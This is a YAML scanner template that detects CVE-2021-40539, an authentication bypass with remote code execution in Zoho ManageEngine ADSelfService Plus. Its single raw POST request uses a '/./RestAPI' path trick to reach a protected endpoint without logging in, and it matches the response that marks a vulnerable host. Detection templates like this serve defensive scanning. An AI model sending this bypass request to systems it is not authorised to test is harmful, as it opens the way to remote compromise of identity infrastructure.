id: CVE-2021-40539

info:
  name: Zoho ManageEngine ADSelfService Plus version 6113 Unauthenticated RCE
  author: daffainfo
  severity: critical
  description: Zoho ManageEngine ADSelfService Plus version 6113 and prior is vulnerable to REST API authentication bypass with resultant remote code execution.
  reference:
    - https://attackerkb.com/topics/DMSNq5zgcW/cve-2021-40539/rapid7-analysis
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40539
  tags: cve,cve2021,rce,zoho
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.80
    cve-id: CVE-2021-40539
    cwe-id: CWE-287

requests:

  - raw:
      - |
        POST /./RestAPI/LogonCustomization HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 27

        methodToCall=previewMobLogo

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '<script type="text/javascript">var d = new Date();window.parent.$("#mobLogo").attr("src","/temp/tempMobPreview.jpeg?"+d.getTime());window.parent.$("#tabLogo").attr("src","/temp/tempMobPreview.jpeg?"+d.getTime());</script>'
        part: body

      - type: status
        status:
          - 200
